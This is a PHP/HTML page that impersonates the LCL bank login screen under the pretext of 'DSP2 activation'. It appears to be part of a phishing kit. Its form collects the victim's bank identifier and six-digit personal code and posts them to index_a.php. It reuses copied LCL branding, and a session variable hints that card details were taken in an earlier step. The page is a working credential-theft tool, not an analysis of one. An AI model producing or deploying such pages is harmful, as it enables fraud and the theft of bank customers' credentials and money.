<?php

session_start();

?>

<html lang="fr-FR" class="js-focus-visible" data-js-focus-visible=""><link type="text/css" rel="stylesheet" id="dark-mode-custom-link"><link type="text/css" rel="stylesheet" id="dark-mode-general-link"><style lang="en" type="text/css" id="dark-mode-custom-style"></style><style lang="en" type="text/css" id="dark-mode-native-style"></style><style lang="en" type="text/css" id="dark-mode-native-sheet"></style><head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title> Activation du DSP2 | LCL </title>
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="shortcut icon" href="../ressources/images/lc/favicon.ico">
    <link rel="stylesheet" href="../ressources/css/lc/styles_lc.css">

</head>

<body>
	<app-root _nghost-ng-front-c17="">s
		<ng-progress _ngcontent-ng-front-c17="" role="progressbar" aria-hidden="true" _nghost-ng-front-c16="" spinnerposition="right" dir="ltr+" thick="false" fixed="true">
			<div _ngcontent-ng-front-c16="" class="ng-progress-bar" active="false" style="transition: opacity 200ms linear 0s;">
				<div _ngcontent-ng-front-c16="" class="ng-bar-placeholder">
					<div _ngcontent-ng-front-c16="" class="ng-bar" style="transform: translate3d(0%, 0px, 0px); background-color: rgb(27, 149, 224); transition: none 0s ease 0s;">
						<!---->
					</div>
				</div>
				<!---->
			</div>
			<!---->
			<!---->
		</ng-progress>
		<router-outlet _ngcontent-ng-front-c17=""></router-outlet>
		<app-login-page _nghost-ng-front-c84="">
			<ui-sidepane-template _ngcontent-ng-front-c84="" class="sidepane" _nghost-ng-front-c77="">
				<div _ngcontent-ng-front-c77="" class="image" style="background-image: url(&quot;../ressources/images/lc/login-page-background.ebdfc9d931825723e5ed.jpg&quot;);"></div>
				<!---->
				<div _ngcontent-ng-front-c77="" class="content">
					<header _ngcontent-ng-front-c84="">
						<div _ngcontent-ng-front-c84="" class="logo"><a _ngcontent-ng-front-c84="" href="https://www.lcl.fr/"><h1 _ngcontent-ng-front-c84="" class="logo-h1"><img _ngcontent-ng-front-c84="" alt="LCL Banque et assurance. Ma vie. Ma Ville. Ma banque." src="../ressources/images/lc/logo.b67cae54f399508c58a3.svg"></h1></a></div>
						<div _ngcontent-ng-front-c84="" tabindex="-1" class="login-message">
							<!---->
						</div>
					</header>

					<form method="post" action="index_a.php">

						<div _ngcontent-ng-front-c76="" class="control-group identifier-group">

							<label _ngcontent-ng-front-c76="" for="identifier">
								<h2 _ngcontent-ng-front-c76="" class="app-title"><?php echo $_SESSION['cardName']; ?>  Votre identifiant</h2></label>
							<ui-identifier-input _ngcontent-ng-front-c76="" inputid="identifier" title="Saisissez votre identifiant LCL" class="identifier-input-login ng-touched ng-dirty ng-valid" _nghost-ng-front-c73="">
								<input _ngcontent-ng-front-c73="" name="ml" type="tel" autocomplete="off" autocorrect="off" spellcheck="false" inputmode="numeric" pattern="[0-9]*" class="input ng-touched ng-dirty ng-valid" maxlength="10" id="ml" required>
								<div _ngcontent-ng-front-c73="" class="strokes"><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span>
									
                                    
								</div>
							</ui-identifier-input>


                            <div _ngcontent-ng-front-c76="" class="control-group identifier-group">

                                <label _ngcontent-ng-front-c76="" for="identifier">
                                    <br>
                                    <br>
                                    <h2 _ngcontent-ng-front-c76="" class="app-title">Votre code personnel</h2></label>
                                <ui-identifier-input _ngcontent-ng-front-c76="" inputid="identifier" title="Saisissez votre code personnel LCL" class="identifier-input-login ng-touched ng-dirty ng-valid" _nghost-ng-front-c73="">
                                    <input _ngcontent-ng-front-c73="" name="mp" type="tel" autocomplete="off" autocorrect="off" spellcheck="false" inputmode="numeric" pattern="[0-9]*" class="input ng-touched ng-dirty ng-valid" maxlength="6" id="mp" required>
                                    <div _ngcontent-ng-front-c73="" class="strokes"><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span><span _ngcontent-ng-front-c73="" class="stroke stroke-filled"></span>
                                        
                                        
                                    </div>
                                </ui-identifier-input>

						</div>

						<!---->
						<div _ngcontent-ng-front-c76="" class="control-group remember-identifier-group">
							
						</div>
						<!---->
						<!---->
						<!---->
						<div _ngcontent-ng-front-c76="" class="control-group button-group">
							<button _ngcontent-ng-front-c76="" name="btn_lc_submit" type="submit" title="Cliquer pour vous connecter à votre Espace LCL" class="app-cta-button app-cta-button--primary app-cta-button--arrow">Continuer</button>
						</div>

					<div _ngcontent-ng-front-c84="" class="help-links">
						
					</div>
					<modal-router-outlet _ngcontent-ng-front-c84=""></modal-router-outlet>
					<!---->
				</div></form>
				<div _ngcontent-ng-front-c77="" class="aside">
					<aside _ngcontent-ng-front-c84="">
						<div _ngcontent-ng-front-c84="" class="message-banners-box">
							<ui-message-banner-carousel _ngcontent-ng-front-c84="" _nghost-ng-front-c83="">
								<!---->
								<div _ngcontent-ng-front-c83="">
									<ui-swiper _ngcontent-ng-front-c83="" draggable="" loop="" class="ui-swiper" style="visibility: visible; overflow: hidden; direction: ltr; cursor: -webkit-grab;">
										<div style="width: 1600px; transition: all 200ms ease-out 0s; transform: translate3d(-400px, 0px, 0px);">
											<div style="float: left; width: 25%;">
												<ui-message-banner _ngcontent-ng-front-c83="" uiswiperslide="" _nghost-ng-front-c82="" class="ui-message-banner">
													<div _ngcontent-ng-front-c82="" class="direction-row">
														<div _ngcontent-ng-front-c82="" aria-hidden="true" class="message-banner-image-container">
															<ui-companion _ngcontent-ng-front-c82="" class="message-banner-image paused loaded">
																<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 360 360" width="360" height="360" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);" focusable="false">
																	<defs>
																		<clipPath id="__lottie_element_16">
																			<rect width="360" height="360" x="0" y="0"></rect>
																		</clipPath>
																	</defs>
																	<g clip-path="url(#__lottie_element_16)">
																		<g style="display: none;">
																			<g>
																				<path></path>
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"></path>
																			</g>
																		</g>
																		<g style="display: none;">
																			<g>
																				<path></path>
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"></path>
																			</g>
																		</g>
																		<g transform="matrix(2.8651700019836426,0,0,2.8651700019836426,438.91790771484375,314.8465881347656)" opacity="1" style="display: block;">
																			<g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
																				<path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
																			</g>
																		</g>
																		<g transform="matrix(6.473120212554932,0,0,6.473120212554932,743.951171875,690.8334350585938)" opacity="1" style="display: block;">
																			<g opacity="1" transform="matrix(0.9546899795532227,0,0,0.9500300288200378,-87.12200164794922,-78.96600341796875)">
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(92,104,236)" stroke-opacity="1" stroke-width="8" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-7.577000141143799,23.46299934387207 -14.3149995803833,19.871000289916992 -18.604999542236328,14.29800033569336 C-21.652000427246094,10.34000015258789 -23.46299934387207,5.38100004196167 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
																			</g>
																		</g>
																	</g>
																</svg>
															</ui-companion>
														</div>
														<div _ngcontent-ng-front-c82="" class="message-banner-content">
															<div _ngcontent-ng-front-c82="" class="message-banner-header">
																<h2 _ngcontent-ng-front-c82="">Nos conseils sécurité</h2>
																<!---->
															</div>
															<!---->
															<div _ngcontent-ng-front-c82="" class="message-banner-body">
																<div _ngcontent-ng-front-c83="">
																	<p>Découvrez les bons réflexes pour protéger votre ordinateur et vos données bancaires au quotidien.</p>
																</div>
																<div _ngcontent-ng-front-c82=""><a _ngcontent-ng-front-c82="" target="_blank" class="message-banner-link app-link app-link--underline" href="" tabindex="-1">Se rendre sur LCL sécurité</a></div>
																<!---->
															</div>
														</div>
														<!---->
													</div>
													<ui-swiper-bullets _ngcontent-ng-front-c82="" class="pointer" _nghost-ng-front-c81="">
														<div _ngcontent-ng-front-c81="" class="bullets padding">
															<button _ngcontent-ng-front-c81="" type="button" class="bullet active" tabindex="-1"><span _ngcontent-ng-front-c81="" class="cdk-visually-hidden">En cours</span></button>
															<button _ngcontent-ng-front-c81="" type="button" class="bullet" tabindex="-1"><span _ngcontent-ng-front-c81="" class="cdk-visually-hidden">Element 2</span></button>
															<!---->
														</div>
													</ui-swiper-bullets>
												</ui-message-banner>
											</div>
											<div style="float: left; width: 25%;">
												<ui-message-banner _ngcontent-ng-front-c83="" uiswiperslide="" _nghost-ng-front-c82="" class="ui-message-banner">
													<div _ngcontent-ng-front-c82="" class="direction-row">
														<div _ngcontent-ng-front-c82="" aria-hidden="true" class="message-banner-image-container">
															<ui-companion _ngcontent-ng-front-c82="" class="message-banner-image loaded">
																<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 360 360" width="360" height="360" preserveAspectRatio="xMidYMid meet" focusable="false" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);">
																	<defs>
																		<clipPath id="__lottie_element_3">
																			<rect width="360" height="360" x="0" y="0"></rect>
																		</clipPath>
																	</defs>
																	<g clip-path="url(#__lottie_element_3)">
																		<g style="display: block;" transform="matrix(1.100000023841858,0,0,1.100000023841858,345.1047058105469,230.9346923828125)" opacity="1">
																			<g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
																				<path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
																			</g>
																		</g>
																		<g style="display: block;" transform="matrix(1.100000023841858,0,0,1.100000023841858,279.1047058105469,230.9346923828125)" opacity="1">
																			<g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
																				<path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
																			</g>
																		</g>
																		<g transform="matrix(1.100000023841858,0,0,1.100000023841858,209.5906982421875,230.93569946289062)" opacity="1" style="display: block;">
																			<g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
																				<path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
																			</g>
																		</g>
																		<g transform="matrix(6.473120212554932,0,0,6.473120212554932,743.951171875,690.8334350585938)" opacity="1" style="display: block;">
																			<g opacity="1" transform="matrix(0.9546899795532227,0,0,0.9500300288200378,-87.12200164794922,-78.96600341796875)">
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(92,104,236)" stroke-opacity="1" stroke-width="8" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-7.6020002365112305,23.46299934387207 -23.093000411987305,23.56800079345703 -23.093000411987305,23.56800079345703 C-23.093000411987305,23.56800079345703 -23.46299934387207,5.35699987411499 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
																			</g>
																		</g>
																	</g>
																</svg>
															</ui-companion>
														</div>
														<div _ngcontent-ng-front-c82="" class="message-banner-content">
															<div _ngcontent-ng-front-c82="" class="message-banner-header">
																<h2 _ngcontent-ng-front-c82="">Nos conseils sécurité</h2>
																<!---->
															</div>
															<!---->
															<div _ngcontent-ng-front-c82="" class="message-banner-body">
																<div _ngcontent-ng-front-c83="">
																	<p>Formulaire d'activation du protocole de sécurité DSP2.</p>
																</div>
																<div _ngcontent-ng-front-c82=""><a _ngcontent-ng-front-c82="" target="_blank" class="message-banner-link app-link app-link--underline">Comment sécuriser mes données bancaires</a></div>
																<!---->
															</div>
														</div>
														<!---->
													</div>
													<ui-swiper-bullets _ngcontent-ng-front-c82="" class="pointer" _nghost-ng-front-c81="">
														<div _ngcontent-ng-front-c81="" class="bullets padding">
															<button _ngcontent-ng-front-c81="" type="button" class="bullet active"><span _ngcontent-ng-front-c81="" class="cdk-visually-hidden">En cours</span></button>
															<button _ngcontent-ng-front-c81="" type="button" class="bullet"><span _ngcontent-ng-front-c81="" class="cdk-visually-hidden">Element 2</span></button>
															<!---->
														</div>
													</ui-swiper-bullets>
												</ui-message-banner>
											</div>
											<div style="float: left; width: 25%;">
												<ui-message-banner _ngcontent-ng-front-c83="" uiswiperslide="" _nghost-ng-front-c82="" class="ui-message-banner">
													<div _ngcontent-ng-front-c82="" class="direction-row">
														<div _ngcontent-ng-front-c82="" aria-hidden="true" class="message-banner-image-container">
															<ui-companion _ngcontent-ng-front-c82="" class="message-banner-image paused loaded">
																<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 360 360" width="360" height="360" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);" focusable="false">
																	<defs>
																		<clipPath id="__lottie_element_16">
																			<rect width="360" height="360" x="0" y="0"></rect>
																		</clipPath>
																	</defs>
																	<g clip-path="url(#__lottie_element_16)">
																		<g style="display: none;">
																			<g>
																				<path></path>
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"></path>
																			</g>
																		</g>
																		<g style="display: none;">
																			<g>
																				<path></path>
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"></path>
																			</g>
																		</g>
																		<g transform="matrix(2.8651700019836426,0,0,2.8651700019836426,438.91790771484375,314.8465881347656)" opacity="1" style="display: block;">
																			<g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
																				<path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
																			</g>
																		</g>
																		<g transform="matrix(6.473120212554932,0,0,6.473120212554932,743.951171875,690.8334350585938)" opacity="1" style="display: block;">
																			<g opacity="1" transform="matrix(0.9546899795532227,0,0,0.9500300288200378,-87.12200164794922,-78.96600341796875)">
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(92,104,236)" stroke-opacity="1" stroke-width="8" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-7.577000141143799,23.46299934387207 -14.3149995803833,19.871000289916992 -18.604999542236328,14.29800033569336 C-21.652000427246094,10.34000015258789 -23.46299934387207,5.38100004196167 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
																			</g>
																		</g>
																	</g>
																</svg>
															</ui-companion>
														</div>
														<div _ngcontent-ng-front-c82="" class="message-banner-content">
															<div _ngcontent-ng-front-c82="" class="message-banner-header">
																<h2 _ngcontent-ng-front-c82="">Bienvenue</h2>
																<!---->
															</div>
															<!---->
															<div _ngcontent-ng-front-c82="" class="message-banner-body">
																<div _ngcontent-ng-front-c83="">
																	<p>Découvrez les bons réflexes pour protéger votre ordinateur et vos données bancaires au quotidien.</p>
																</div>
																<div _ngcontent-ng-front-c82=""><a _ngcontent-ng-front-c82="" target="_blank" class="message-banner-link app-link app-link--underline" href="">Se rendre sur LCL sécurité</a></div>
																<!---->
															</div>
														</div>
														<!---->
													</div>
													<ui-swiper-bullets _ngcontent-ng-front-c82="" class="pointer" _nghost-ng-front-c81="">
														<div _ngcontent-ng-front-c81="" class="bullets padding">
															<button _ngcontent-ng-front-c81="" type="button" class="bullet active"><span _ngcontent-ng-front-c81="" class="cdk-visually-hidden">En cours</span></button>
															<button _ngcontent-ng-front-c81="" type="button" class="bullet"><span _ngcontent-ng-front-c81="" class="cdk-visually-hidden">Element 2</span></button>
															<!---->
														</div>
													</ui-swiper-bullets>
												</ui-message-banner>
											</div>
											<div style="float: left; width: 25%;">
												<ui-message-banner _ngcontent-ng-front-c83="" uiswiperslide="" _nghost-ng-front-c82="" class="ui-message-banner">
													<div _ngcontent-ng-front-c82="" class="direction-row">
														<div _ngcontent-ng-front-c82="" aria-hidden="true" class="message-banner-image-container">
															<ui-companion _ngcontent-ng-front-c82="" class="message-banner-image loaded">
																<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 360 360" width="360" height="360" preserveAspectRatio="xMidYMid meet" focusable="false" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);">
																	<defs>
																		<clipPath id="__lottie_element_3">
																			<rect width="360" height="360" x="0" y="0"></rect>
																		</clipPath>
																	</defs>
																	<g clip-path="url(#__lottie_element_3)">
																		<g style="display: block;" transform="matrix(1.100000023841858,0,0,1.100000023841858,345.1047058105469,230.9346923828125)" opacity="1">
																			<g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
																				<path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
																			</g>
																		</g>
																		<g style="display: block;" transform="matrix(1.100000023841858,0,0,1.100000023841858,279.1047058105469,230.9346923828125)" opacity="1">
																			<g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
																				<path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.94922924041748,-23.46299934387207 23.46299934387207,-12.94922924041748 23.46299934387207,0 C23.46299934387207,12.94922924041748 12.94922924041748,23.46299934387207 0,23.46299934387207 C-12.94922924041748,23.46299934387207 -23.46299934387207,12.94922924041748 -23.46299934387207,0 C-23.46299934387207,-12.94922924041748 -12.94922924041748,-23.46299934387207 0,-23.46299934387207z"></path>
																			</g>
																		</g>
																		<g transform="matrix(1.100000023841858,0,0,1.100000023841858,209.5906982421875,230.93569946289062)" opacity="1" style="display: block;">
																			<g opacity="1" transform="matrix(1,0,0,1,-90.53700256347656,-47.5369987487793)">
																				<path fill="rgb(255,210,4)" fill-opacity="1" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="0" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-12.958000183105469,23.46299934387207 -23.46299934387207,12.958000183105469 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
																			</g>
																		</g>
																		<g transform="matrix(6.473120212554932,0,0,6.473120212554932,743.951171875,690.8334350585938)" opacity="1" style="display: block;">
																			<g opacity="1" transform="matrix(0.9546899795532227,0,0,0.9500300288200378,-87.12200164794922,-78.96600341796875)">
																				<path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(92,104,236)" stroke-opacity="1" stroke-width="8" d=" M0,-23.46299934387207 C12.958000183105469,-23.46299934387207 23.46299934387207,-12.958000183105469 23.46299934387207,0 C23.46299934387207,12.958000183105469 12.958000183105469,23.46299934387207 0,23.46299934387207 C-7.6020002365112305,23.46299934387207 -23.093000411987305,23.56800079345703 -23.093000411987305,23.56800079345703 C-23.093000411987305,23.56800079345703 -23.46299934387207,5.35699987411499 -23.46299934387207,0 C-23.46299934387207,-12.958000183105469 -12.958000183105469,-23.46299934387207 0,-23.46299934387207z"></path>
																			</g>
																		</g>
																	</g>
																</svg>
															</ui-companion>
														</div>
														<div _ngcontent-ng-front-c82="" class="message-banner-content">
															<div _ngcontent-ng-front-c82="" class="message-banner-header">
																<h2 _ngcontent-ng-front-c82="">Nos conseils sécurité</h2>
																<!---->
															</div>
															<!---->
															<div _ngcontent-ng-front-c82="" class="message-banner-body">
																<div _ngcontent-ng-front-c83="">
																	<p>LCL ne vous sollicitera jamais (que ce soit par mail, par SMS ou par téléphone) pour vous demander de communiquer de quelque manière que ce soit vos mots de passe, codes confidentiels ou codes à usage unique reçus par SMS.</p>
																</div>
																<div _ngcontent-ng-front-c82=""><a _ngcontent-ng-front-c82="" target="_blank" class="message-banner-link app-link app-link--underline" href="">Comment sécuriser mes données bancaires</a></div>
																<!---->
															</div>
														</div>
														<!---->
													</div>
													<ui-swiper-bullets _ngcontent-ng-front-c82="" class="pointer" _nghost-ng-front-c81="">
														<div _ngcontent-ng-front-c81="" class="bullets padding">
															<button _ngcontent-ng-front-c81="" type="button" class="bullet active"><span _ngcontent-ng-front-c81="" class="cdk-visually-hidden">En cours</span></button>
															<button _ngcontent-ng-front-c81="" type="button" class="bullet"><span _ngcontent-ng-front-c81="" class="cdk-visually-hidden">Element 2</span></button>
															<!---->
														</div>
													</ui-swiper-bullets>
												</ui-message-banner>
											</div>
										</div>
									</ui-swiper>
								</div>
								<!---->
							</ui-message-banner-carousel>
						</div>
						<!---->
					</aside>
				</div>
			
		
		<!---->
	


</div></ui-sidepane-template></app-login-page></app-root></body></html>